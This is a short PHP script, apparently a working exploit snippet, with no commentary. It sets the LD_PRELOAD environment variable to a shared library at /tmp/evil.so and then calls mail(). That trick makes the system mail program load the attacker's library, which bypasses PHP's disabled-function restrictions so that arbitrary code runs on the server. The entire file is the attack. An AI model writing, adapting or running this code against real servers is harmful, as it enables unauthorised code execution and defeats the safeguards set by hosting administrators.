<?
putenv('LD_PRELOAD=/tmp/evil.so');

mail('lazy@iq.pl','lazy@iq.pl',"lazy@iq.pl");

echo 'ok';
